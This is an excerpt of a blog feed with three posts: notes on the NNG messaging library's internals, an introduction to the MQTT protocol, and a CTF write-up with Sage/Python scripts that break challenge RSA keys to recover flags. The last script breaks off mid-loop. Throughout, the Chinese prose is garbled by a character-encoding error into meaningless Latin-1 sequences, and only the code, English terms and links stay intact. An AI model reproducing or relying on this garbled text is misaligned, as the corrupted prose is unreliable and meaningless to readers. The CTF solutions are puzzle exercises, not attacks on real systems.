class="hljs-section">utils/:</span><br></code></pre></td></tr></table></figure><p>å®ç”¨å·¥å…·åŒ…ï¼ŒåŒ…å«åŸºæœ¬æ•°æ®ç»“æ„(<code>list/queue/hash</code>)ã€äº’æ–¥åŠåŸå­æ“ä½œ(<code>mutex/atomic</code>)ç­‰</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">transports/:</span><br></code></pre></td></tr></table></figure><p>é€šä¿¡å±‚å®ç°ï¼ŒåŒ…æ‹¬(inproc:è¿›ç¨‹å†…é€šä¿¡ï¼›ipc:è¿›ç¨‹é—´é€šä¿¡ï¼›tcpï¼štcpé€šä¿¡)</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">protocols/:</span><br></code></pre></td></tr></table></figure><p>åè®®å±‚å®ç°ï¼ŒåŒ…æ‹¬(REQREP:è¯·æ±‚å“åº”ï¼›PUBSUB:è®¢é˜…å‘å¸ƒç­‰)</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">core/:</span><br></code></pre></td></tr></table></figure><p>é€šç”¨ä»£ç </p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">aio/:</span><br></code></pre></td></tr></table></figure><p>çº¿ç¨‹æ± æ¨¡æ‹Ÿçš„å¼‚æ­¥æ“ä½œï¼Œå¸¦çŠ¶æ€æœºçš„äº‹ä»¶é©±åŠ¨ç­‰</p><h2 id="æ•°æ®ä¼ è¾“"><a href="#æ•°æ®ä¼ è¾“" class="headerlink" title="æ•°æ®ä¼ è¾“"></a>æ•°æ®ä¼ è¾“</h2><h3 id="å‘é€æ•°æ®"><a href="#å‘é€æ•°æ®" class="headerlink" title="å‘é€æ•°æ®"></a>å‘é€æ•°æ®</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">nng_sendmsg<br><br>nng_aio_<span class="hljs-keyword">set</span>_timeout<br><br>nng_aio_<span class="hljs-keyword">set</span>_msg<br><br>nng_send_aio<br><br>nni_aio_get_msg<br><br>nni_sock_find<br><br>nni_sock_send --&gt; sock_send<br><br>nni_sock_rele<br><br>nng_aio_wait<br><br>nng_aio_result<br></code></pre></td></tr></table></figure><h3 id="æ¥æ”¶æ•°æ®"><a href="#æ¥æ”¶æ•°æ®" class="headerlink" title="æ¥æ”¶æ•°æ®"></a>æ¥æ”¶æ•°æ®</h3><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xl">nng_recvmsg<br><br>nng_aio_set_timeout<br><br>nng_recv_aio<br><br>nni_sock_find<br><br><span class="hljs-function"><span class="hljs-title">nni_sock_recv</span> --&gt;</span> sock_recv<br><br>nni_sock_rele<br><br>nng_aio_wait<br><br>nng_aio_result<br><br>nng_aio_free<br></code></pre></td></tr></table></figure><h2 id="AIO"><a href="#AIO" class="headerlink" title="AIO"></a>AIO</h2><h3 id="AIOçŠ¶æ€"><a href="#AIOçŠ¶æ€" class="headerlink" title="AIOçŠ¶æ€"></a>AIOçŠ¶æ€</h3><p>AIO ç»“æ„å¯ä»¥æºå¸¦æœ€å¤š 4 ä¸ªä¸åŒçš„è¾“å…¥å€¼ï¼Œæœ€å¤š 4 ä¸ªä¸åŒçš„è¾“å‡ºå€¼ï¼Œä»¥åŠæœ€å¤š 4 ä¸ªä¸åŒçš„â€œç§æœ‰çŠ¶æ€â€å€¼ã€‚ è¾“å…¥å’Œè¾“å‡ºçš„å«ä¹‰ç”±è¢«è°ƒç”¨çš„ I/O å‡½æ•°å†³å®šã€‚</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs elm">typedef enum &#123;<br><br><span class="hljs-type">NNG_INIT_RECV</span> = 0,<br><br><span class="hljs-type">NNG_RECV_RET_SEND</span>,<br><br><span class="hljs-type">NNG_SEND_RET_RECV</span>,<br><br><span class="hljs-type">NNG_RECV_RET_RECV</span>,<br><br>&#125; nng_aio_state_t;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>IoT</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IoT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IoTå®‰å…¨ä¹‹MQTTåè®®1</title>
    <link href="/2023/08/09/MQTT1/"/>
    <url>/2023/08/09/MQTT1/</url>
    
    <content type="html"><![CDATA[<h2 id="ä»€ä¹ˆæ˜¯-MQTTï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯-MQTTï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ MQTTï¼Ÿ"></a>ä»€ä¹ˆæ˜¯ MQTTï¼Ÿ</h2><p>MQTTï¼ˆMessage Queuing Telemetry Transportï¼‰æ˜¯ä¸€ç§è½»é‡çº§ã€åŸºäºå‘å¸ƒ-è®¢é˜…æ¨¡å¼çš„æ¶ˆæ¯ä¼ è¾“åè®®ï¼Œé€‚ç”¨äºèµ„æºå—é™çš„è®¾å¤‡å’Œä½å¸¦å®½ã€é«˜å»¶è¿Ÿæˆ–ä¸ç¨³å®šçš„ç½‘ç»œç¯å¢ƒã€‚å®ƒåœ¨ç‰©è”ç½‘åº”ç”¨ä¸­å¹¿å—æ¬¢è¿ï¼Œèƒ½å¤Ÿå®ç°ä¼ æ„Ÿå™¨ã€æ‰§è¡Œå™¨å’Œå…¶å®ƒè®¾å¤‡ä¹‹é—´çš„é«˜æ•ˆé€šä¿¡ã€‚</p><h2 id="MQTT-ä¸å…¶ä»–åè®®å¯¹æ¯”"><a href="#MQTT-ä¸å…¶ä»–åè®®å¯¹æ¯”" class="headerlink" title="MQTT ä¸å…¶ä»–åè®®å¯¹æ¯”"></a>MQTT ä¸å…¶ä»–åè®®å¯¹æ¯”</h2><h3 id="MQTT-vs-HTTP"><a href="#MQTT-vs-HTTP" class="headerlink" title="MQTT vs HTTP"></a>MQTT vs HTTP</h3><ul><li>MQTT çš„æœ€å°æŠ¥æ–‡ä»…ä¸º 2 ä¸ªå­—èŠ‚ï¼Œæ¯” HTTP å ç”¨æ›´å°‘çš„ç½‘ç»œå¼€é”€ã€‚</li><li>MQTT ä¸ HTTP éƒ½èƒ½ä½¿ç”¨ TCP è¿æ¥ï¼Œå¹¶å®ç°ç¨³å®šã€å¯é çš„ç½‘ç»œè¿æ¥ã€‚</li><li>MQTT åŸºäºå‘å¸ƒè®¢é˜…æ¨¡å‹ï¼ŒHTTP åŸºäºè¯·æ±‚å“åº”ï¼Œå› æ­¤ MQTT æ”¯æŒåŒå·¥é€šä¿¡ã€‚</li><li>MQTT å¯å®æ—¶æ¨é€æ¶ˆæ¯ï¼Œä½† HTTP éœ€è¦é€šè¿‡è½®è¯¢è·å–æ•°æ®æ›´æ–°ã€‚</li><li>MQTT æ˜¯æœ‰çŠ¶æ€çš„ï¼Œä½†æ˜¯ HTTP æ˜¯æ— çŠ¶æ€çš„ã€‚</li><li>MQTT å¯ä»è¿æ¥å¼‚å¸¸æ–­å¼€ä¸­æ¢å¤ï¼ŒHTTP æ— æ³•å®ç°æ­¤ç›®æ ‡ã€‚</li></ul><h3 id="MQTT-vs-XMPP"><a href="#MQTT-vs-XMPP" class="headerlink" title="MQTT vs XMPP"></a>MQTT vs XMPP</h3><p>MQTT åè®®è®¾è®¡ç®€å•è½»é‡ã€è·¯ç”±çµæ´»ï¼Œå°†åœ¨ç§»åŠ¨äº’è”ç½‘ã€ç‰©è”ç½‘æ¶ˆæ¯é¢†åŸŸï¼Œå…¨é¢å–ä»£ PC æ—¶ä»£çš„ XMPP åè®®ã€‚</p><ul><li>MQTT æŠ¥æ–‡ä½“ç§¯å°ä¸”ç¼–è§£ç å®¹æ˜“ï¼ŒXMPP åŸºäºç¹é‡çš„ XMLï¼ŒæŠ¥æ–‡ä½“ç§¯å¤§ä¸”äº¤äº’ç¹çã€‚</li><li>MQTT åŸºäºå‘å¸ƒè®¢é˜…æ¨¡å¼ï¼Œç›¸æ¯” XMPP åŸºäº JID çš„ç‚¹å¯¹ç‚¹æ¶ˆæ¯è·¯ç”±æ›´ä¸ºçµæ´»ã€‚</li><li>MQTT æ”¯æŒ JSONã€äºŒè¿›åˆ¶ç­‰ä¸åŒç±»å‹æŠ¥æ–‡ã€‚XMPP é‡‡ç”¨ XML æ‰¿è½½æŠ¥æ–‡ï¼ŒäºŒè¿›åˆ¶å¿…é¡» Base64 ç¼–ç ç­‰å¤„ç†ã€‚</li><li>MQTT é€šè¿‡ QoS ä¿è¯æ¶ˆæ¯å¯é ä¼ è¾“ï¼ŒXMPP ä¸»åè®®å¹¶æœªå®šä¹‰ç±»ä¼¼æœºåˆ¶ã€‚</li></ul><h2 id="MQTT-çš„å·¥ä½œåŸç†"><a href="#MQTT-çš„å·¥ä½œåŸç†" class="headerlink" title="MQTT çš„å·¥ä½œåŸç†"></a>MQTT çš„å·¥ä½œåŸç†</h2><h3 id="MQTT-å®¢æˆ·ç«¯"><a href="#MQTT-å®¢æˆ·ç«¯" class="headerlink" title="MQTT å®¢æˆ·ç«¯"></a>MQTT å®¢æˆ·ç«¯</h3><p>ä»»ä½•è¿è¡Œ <a href="https://www.emqx.com/zh/mqtt-client-sdk">MQTT å®¢æˆ·ç«¯åº“</a>çš„åº”ç”¨æˆ–è®¾å¤‡éƒ½æ˜¯ MQTT å®¢æˆ·ç«¯ã€‚ä¾‹å¦‚ï¼Œä½¿ç”¨ MQTT çš„å³æ—¶é€šè®¯åº”ç”¨æ˜¯å®¢æˆ·ç«¯ï¼Œä½¿ç”¨ MQTT ä¸ŠæŠ¥æ•°æ®çš„å„ç§ä¼ æ„Ÿå™¨æ˜¯å®¢æˆ·ç«¯ï¼Œå„ç§ <a href="https://www.emqx.com/zh/blog/mqtt-client-tools">MQTT æµ‹è¯•å·¥å…·</a>ä¹Ÿæ˜¯å®¢æˆ·ç«¯ã€‚</p><h3 id="MQTT-Broker"><a href="#MQTT-Broker" class="headerlink" title="MQTT Broker"></a>MQTT Broker</h3><p>MQTT Broker æ˜¯è´Ÿè´£å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚çš„å…³é”®ç»„ä»¶ï¼ŒåŒ…æ‹¬å»ºç«‹è¿æ¥ã€æ–­å¼€è¿æ¥ã€è®¢é˜…å’Œå–æ¶ˆè®¢é˜…ç­‰æ“ä½œï¼ŒåŒæ—¶è¿˜è´Ÿè´£æ¶ˆæ¯çš„è½¬å‘ã€‚ä¸€ä¸ªé«˜æ•ˆå¼ºå¤§çš„ MQTT Broker èƒ½å¤Ÿè½»æ¾åº”å¯¹æµ·é‡è¿æ¥å’Œç™¾ä¸‡çº§æ¶ˆæ¯ååé‡ï¼Œä»è€Œå¸®åŠ©ç‰©è”ç½‘æœåŠ¡æä¾›å•†ä¸“æ³¨äºä¸šåŠ¡å‘å±•ï¼Œå¿«é€Ÿæ„å»ºå¯é çš„ MQTT åº”ç”¨ã€‚</p><p>å…³äº MQTT Broker çš„æ›´å¤šè¯¦æƒ…ï¼Œè¯·å‚é˜…æ–‡ç«  <a href="https://www.emqx.com/en/blog/the-ultimate-guide-to-mqtt-broker-comparison">2023 å¹´æœ€å…¨é¢çš„ MQTT Broker æ¯”è¾ƒæŒ‡å—</a>ã€‚</p><h3 id="å‘å¸ƒ-è®¢é˜…æ¨¡å¼"><a href="#å‘å¸ƒ-è®¢é˜…æ¨¡å¼" class="headerlink" title="å‘å¸ƒ-è®¢é˜…æ¨¡å¼"></a>å‘å¸ƒ-è®¢é˜…æ¨¡å¼</h3><p>å‘å¸ƒ-è®¢é˜…æ¨¡å¼ä¸å®¢æˆ·ç«¯-æœåŠ¡å™¨æ¨¡å¼çš„ä¸åŒä¹‹å¤„åœ¨äºï¼Œå®ƒå°†å‘é€æ¶ˆæ¯çš„å®¢æˆ·ç«¯ï¼ˆå‘å¸ƒè€…ï¼‰å’Œæ¥æ”¶æ¶ˆæ¯çš„å®¢æˆ·ç«¯ï¼ˆè®¢é˜…è€…ï¼‰è¿›è¡Œäº†è§£è€¦ã€‚å‘å¸ƒè€…å’Œè®¢é˜…è€…ä¹‹é—´æ— éœ€å»ºç«‹ç›´æ¥è¿æ¥ï¼Œè€Œæ˜¯é€šè¿‡ MQTT Broker æ¥è´Ÿè´£æ¶ˆæ¯çš„è·¯ç”±å’Œåˆ†å‘ã€‚</p><p>ä¸‹å›¾å±•ç¤ºäº† MQTT å‘å¸ƒ/è®¢é˜…è¿‡ç¨‹ã€‚æ¸©åº¦ä¼ æ„Ÿå™¨ä½œä¸ºå®¢æˆ·ç«¯è¿æ¥åˆ° MQTT Brokerï¼Œå¹¶é€šè¿‡å‘å¸ƒæ“ä½œå°†æ¸©åº¦æ•°æ®å‘å¸ƒåˆ°ä¸€ä¸ªç‰¹å®šä¸»é¢˜ï¼ˆä¾‹å¦‚ Temperatureï¼‰ã€‚MQTT Broker æ¥æ”¶åˆ°è¯¥æ¶ˆæ¯åä¼šè´Ÿè´£å°†å…¶è½¬å‘ç»™è®¢é˜…äº†ç›¸åº”ä¸»é¢˜ï¼ˆTemperatureï¼‰çš„è®¢é˜…è€…å®¢æˆ·ç«¯ã€‚</p><p><img src="/mdimg/mqtt1/2.png"></p><h3 id="ä¸»é¢˜"><a href="#ä¸»é¢˜" class="headerlink" title="ä¸»é¢˜"></a>ä¸»é¢˜</h3><p>MQTT åè®®æ ¹æ®ä¸»é¢˜æ¥è½¬å‘æ¶ˆæ¯ã€‚ä¸»é¢˜é€šè¿‡ / æ¥åŒºåˆ†å±‚çº§ï¼Œç±»ä¼¼äº URL è·¯å¾„ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">chat/room/1<br><br>sensor/10/temperature<br><br>sensor/+/temperature<br></code></pre></td></tr></table></figure><p>MQTT ä¸»é¢˜æ”¯æŒä»¥ä¸‹ä¸¤ç§é€šé…ç¬¦ï¼š<code>+</code> å’Œ <code>#</code>ã€‚</p><ul><li><code>+</code>ï¼šè¡¨ç¤ºå•å±‚é€šé…ç¬¦ï¼Œä¾‹å¦‚ <code>a/+</code> åŒ¹é… <code>a/x</code>æˆ– <code>a/y</code>ã€‚</li><li><code>#</code>ï¼šè¡¨ç¤ºå¤šå±‚é€šé…ç¬¦ï¼Œä¾‹å¦‚ <code>a/#</code> åŒ¹é… <code>a/x</code>ã€<code>a/b/c/d</code>ã€‚</li></ul><p>***æ³¨æ„***<em>ï¼šé€šé…ç¬¦ä¸»é¢˜åªèƒ½ç”¨äºè®¢é˜…ï¼Œä¸èƒ½ç”¨äºå‘å¸ƒã€‚</em></p><p>å…³äº MQTT ä¸»é¢˜çš„æ›´å¤šè¯¦æƒ…ï¼Œè¯·å‚é˜…æ–‡ç« <a href="https://www.emqx.com/zh/blog/advanced-features-of-mqtt-topics">é€šè¿‡æ¡ˆä¾‹ç†è§£ MQTT ä¸»é¢˜ä¸é€šé…ç¬¦</a>ã€‚</p><h3 id="QoS"><a href="#QoS" class="headerlink" title="QoS"></a>QoS</h3><p>MQTT æä¾›äº†ä¸‰ç§æœåŠ¡è´¨é‡ï¼ˆQoSï¼‰ï¼Œåœ¨ä¸åŒç½‘ç»œç¯å¢ƒä¸‹ä¿è¯æ¶ˆæ¯çš„å¯é æ€§ã€‚</p><ul><li>QoS 0ï¼šæ¶ˆæ¯æœ€å¤šä¼ é€ä¸€æ¬¡ã€‚å¦‚æœå½“å‰å®¢æˆ·ç«¯ä¸å¯ç”¨ï¼Œå®ƒå°†ä¸¢å¤±è¿™æ¡æ¶ˆæ¯ã€‚</li><li>QoS 1ï¼šæ¶ˆæ¯è‡³å°‘ä¼ é€ä¸€æ¬¡ã€‚</li><li>QoS 2ï¼šæ¶ˆæ¯åªä¼ é€ä¸€æ¬¡ã€‚</li></ul><p>å…³äº MQTT QoS çš„æ›´å¤šè¯¦æƒ…ï¼Œè¯·å‚é˜…æ–‡ç«  <a href="https://www.emqx.com/zh/blog/introduction-to-mqtt-qos">MQTT QoS 0, 1, 2 ä»‹ç»</a>ã€‚</p><h2 id="MQTT-çš„å·¥ä½œæµç¨‹"><a href="#MQTT-çš„å·¥ä½œæµç¨‹" class="headerlink" title="MQTT çš„å·¥ä½œæµç¨‹"></a>MQTT çš„å·¥ä½œæµç¨‹</h2><p>åœ¨äº†è§£äº† MQTT çš„åŸºæœ¬ç»„ä»¶ä¹‹åï¼Œè®©æˆ‘ä»¬æ¥çœ‹çœ‹å®ƒçš„ä¸€èˆ¬å·¥ä½œæµç¨‹ï¼š</p><ol><li><strong>å®¢æˆ·ç«¯ä½¿ç”¨ TCP/IP åè®®ä¸ Broker å»ºç«‹è¿æ¥</strong>ï¼Œå¯ä»¥é€‰æ‹©ä½¿ç”¨ TLS/SSL åŠ å¯†æ¥å®ç°å®‰å…¨é€šä¿¡ã€‚å®¢æˆ·ç«¯æä¾›è®¤è¯ä¿¡æ¯ï¼Œå¹¶æŒ‡å®šä¼šè¯ç±»å‹ï¼ˆClean Session æˆ– Persistent Sessionï¼‰ã€‚</li><li><strong>å®¢æˆ·ç«¯æ—¢å¯ä»¥å‘ç‰¹å®šä¸»é¢˜å‘å¸ƒæ¶ˆæ¯ï¼Œä¹Ÿå¯ä»¥è®¢é˜…ä¸»é¢˜ä»¥æ¥æ”¶æ¶ˆæ¯</strong>ã€‚å½“å®¢æˆ·ç«¯å‘å¸ƒæ¶ˆæ¯æ—¶ï¼Œå®ƒä¼šå°†æ¶ˆæ¯å‘é€ç»™ MQTT Brokerï¼›è€Œå½“å®¢æˆ·ç«¯è®¢é˜…æ¶ˆæ¯æ—¶ï¼Œå®ƒä¼šæ¥æ”¶ä¸è®¢é˜…ä¸»é¢˜ç›¸å…³çš„æ¶ˆæ¯ã€‚</li><li><strong>MQTT Broker æ¥æ”¶å‘å¸ƒçš„æ¶ˆæ¯</strong>ï¼Œå¹¶å°†è¿™äº›æ¶ˆæ¯è½¬å‘ç»™è®¢é˜…äº†å¯¹åº”ä¸»é¢˜çš„å®¢æˆ·ç«¯ã€‚å®ƒæ ¹æ® QoS ç­‰çº§ç¡®ä¿æ¶ˆæ¯å¯é ä¼ é€’ï¼Œå¹¶æ ¹æ®ä¼šè¯ç±»å‹ä¸ºæ–­å¼€è¿æ¥çš„å®¢æˆ·ç«¯å­˜å‚¨æ¶ˆæ¯ã€‚</li></ol>]]></content>
    
    
    <categories>
      
      <category>IoT</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IoT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HWS2023 å¤ä»¤è¥</title>
    <link href="/2023/08/04/HWSsummer2023/"/>
    <url>/2023/08/04/HWSsummer2023/</url>
    
    <content type="html"><![CDATA[<p><img src="/mdimg/2023hwsummer/1.png"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><p>å¼ºç½‘æ¯2022Factoré­”æ”¹ï¼Œå‚è€ƒå¤§ä½¬çš„åšå®¢ï¼Œå†™çš„éå¸¸ç»†<br><a href="https://ssst0n3.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/CTF/crypto/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/RSA/Prime-Power-RSA/%E5%BC%BA%E7%BD%91%E6%9D%AF-Qualifier-2022/Crypto/Factor/%E5%BC%BA%E7%BD%91%E6%9D%AF-Qualifier-2022CryptoFactor-writeup.html">https://ssst0n3.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/CTF/crypto/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/RSA/Prime-Power-RSA/%E5%BC%BA%E7%BD%91%E6%9D%AF-Qualifier-2022/Crypto/Factor/%E5%BC%BA%E7%BD%91%E6%9D%AF-Qualifier-2022CryptoFactor-writeup.html</a><br>Paperï¼š<a href="https://eprint.iacr.org/2015/399.pdf">https://eprint.iacr.org/2015/399.pdf</a><br><img src="/mdimg/2023hwsummer/2.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python">m1=<span class="hljs-number">8334176273377687778925968652923982846998724107624538105654894737480608040787164942908664678429487595866375466955578536932646638608374859799560790357357355475153852315429988251406716837806949387421402107779526648346112857245251481791000156326311794515247012084479404963628187413781724893173183595037984078029706687141452980915897613598715166764006079337996939237831127877822777298891345240992224457502307777453813403723860370336259768714433691700008761598135158249554720239480856332237245140606893060889458298812027643186014638882487288529484407249417947342798261233371859439003556025622531286607093086262182961900221</span><br>m2=<span class="hljs-number">22291783101991466901669802811072286361463259096412523019927956845014956726984633944311563809077545336731345629003968417408385538540199052480763352937138063001691494078141034164060073208592072783644252721127901996835233091410441838546235477819239598146496144359952946239328842198897348830164467799618269341456666825968971193729838026760012332020223490546511437879465268118749332615890600046622926159177680882780495663448654527562370133394251859961739946007037825763819500955365636946510343942994301809125029616066868596044885547005547390446468651797783520279531291808102209463733268922901056842903640261702268483580079</span><br>n2=<span class="hljs-number">26989781630503676259502221325791347584607522857769579575297691973258919576768826427059198152035415835627885162613470528107575781277590981314410130242259476764500731263549070841939946410404214950861916808234008589966849302830389937977667872854316531408288338541977868568209278283760692866116947597445559763998608870359453835826711179703215320653445704522573070650642347871171425399227090705774976383452533375854187754721093890020986550939103071021619840797519979671188117673303672023522910200606134989916541289908538417562640981839074992935652363458747488201289997240226553340491203815779083605965873519144351105635977</span><br>e2 = <span class="hljs-number">0x10001</span><br>c2=<span class="hljs-number">15608493359172313429111250362547316415137342033261379619116685637094829328864086722267534755459655689598026363165606700718051739433022581810982230521098576597484850535770518552787220173105513426779515790426303985414120033452747683669501078476628404455341179818932159581239994489678323564587149645006231756392148052557984581049067156468083162932334692086321511063682574943502393749684556026493316348892705114791740287823927634401828970155725090197482067045119003108806888768161101755244340832271562849138340706213702438667804460812804485276133545408754720942940596865774516864097546006862891145251661268265204662316437</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve2</span>(<span class="hljs-params">m1, m2</span>):<br>    m1 = <span class="hljs-built_in">int</span>(m1)<br>    m2 = <span class="hljs-built_in">int</span>(m2)<br>    PR.&lt;x&gt; = PolynomialRing(Zmod(n2))<br>    f = m1*m2*x-(m2-m1)<br>    r = <span class="hljs-number">7</span><br>    beta = <span class="hljs-number">1</span>/(r+<span class="hljs-number">1</span>)<br>    idx = (r*(r-<span class="hljs-number">1</span>)) / ((r+<span class="hljs-number">1</span>)*(r+<span class="hljs-number">1</span>))<br>    kbits = <span class="hljs-built_in">int</span>(<span class="hljs-number">2048</span>*idx)//<span class="hljs-number">2</span><br><br>    <span class="hljs-keyword">from</span> sage.misc.verbose <span class="hljs-keyword">import</span> set_verbose<br>    set_verbose(<span class="hljs-number">2</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------LLL debug---------------&quot;</span>)<br>    x = f.monic().small_roots(X=<span class="hljs-number">2</span>**kbits, beta=beta)[<span class="hljs-number">0</span>]<br>    set_verbose(<span class="hljs-number">0</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-------------------------------------------&quot;</span>)<br>    equ = m1*m2*x-(m2-m1)<br>    g = gcd(equ, n2)<br>    p = <span class="hljs-built_in">int</span>(g)^(<span class="hljs-number">1</span>/(r-<span class="hljs-number">1</span>))<br>    <span class="hljs-keyword">assert</span> n2%p == <span class="hljs-number">0</span><br>    q = n2//p^r<br>    <span class="hljs-keyword">assert</span> n2%q == <span class="hljs-number">0</span><br>    phi = p^(r-<span class="hljs-number">1</span>)*(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>    d = inverse_mod(e2, phi)<br>    m = <span class="hljs-built_in">pow</span>(c2, d, n2)<br>    <span class="hljs-keyword">return</span> m<br><br>b = solve2(m1,m2)<br><span class="hljs-comment">#print(b)</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(b)[<span class="hljs-number">2</span>:]))<br><br><span class="hljs-comment">#flag&#123;RSA_1s_s0_ez_4nd_hwser_c4n_bre4k_1t!&#125;</span><br></code></pre></td></tr></table></figure><h3 id="random"><a href="#random" class="headerlink" title="random"></a>random</h3><p>å‚è€ƒ<a href="https://tttang.com/archive/1504/#toc_3ammadleman-manders-miller-cubic-root-extraction-method">https://tttang.com/archive/1504/#toc_3ammadleman-manders-miller-cubic-root-extraction-method</a><br>æ€è·¯æ˜¯å…ˆå»çˆ†ç ´è¿™ä¸ªå·¦ç§»çš„ä½æ•°ï¼Œç„¶åæŒ‰ç…§é¢˜ç›®ä¸­ç”Ÿæˆç´ æ•°çš„è·¯å­æ¥ã€‚ç”¨<code>n</code>æ˜¯å¦å¯ä»¥æ•´é™¤é‚£ä¸ªç´ æ•°æ¥åˆ¤æ–­æ˜¯ä¸æ˜¯æ­£ç¡®çš„ç´ æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> *<br><br>n = <span class="hljs-number">255550794734774347335455038653204099810524562323968101081052744238324333979282590769066826059535810339765419405089707653972316828518446466787073982991340735273047955757161722774546888128720663627716647123110956021905275918358574092054477588935546729192812379266210918802470144452212508255209922150559524376661512464064852413804511191503030046546647554981646983220695416838829085308878177824361071544916728725428437436959573167863053126718594118224053088660739173865895266537548733106779437480905737491231720771570860988017959907437998012442781279100256862684919251885437194156545435396952798548033193683684362049646718627530076461463826459504520525895649547513376441325848313193080013281816762156916219271109726593135112626577858906494025788770088106285316571255392298608980679161123528759865796345121056864973189231253364595956642612401745212207858555858704724770456899071144650909246822311039572915447866615638976747716646382091135281119109866295649034560378368202797914202112090339159898226929176034503535419893300159083361891627300767030933209665917744361038219820997348160094737332979677839131999258559999565207302339242257832022939036526481610130970477187338439181123984340269665409009894192138483254592729253191096427332283419085864095600303323775372526431524911842065699875575955728772820558157791292247976982470646890930951250598649964200733076634093613078091713383782021194766013790646324780327618195433827227105459480409797466859653960886570869469172506894631937612508518886406112758352094014377947728184352908630672750330561369500089138179794848896959683336195170519521</span><br>p_list = []<br><span class="hljs-comment">#for i in tqdm(range(128,256)):</span><br>base = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">175</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> trange(<span class="hljs-number">0</span>,<span class="hljs-number">500000</span>):<br>    p 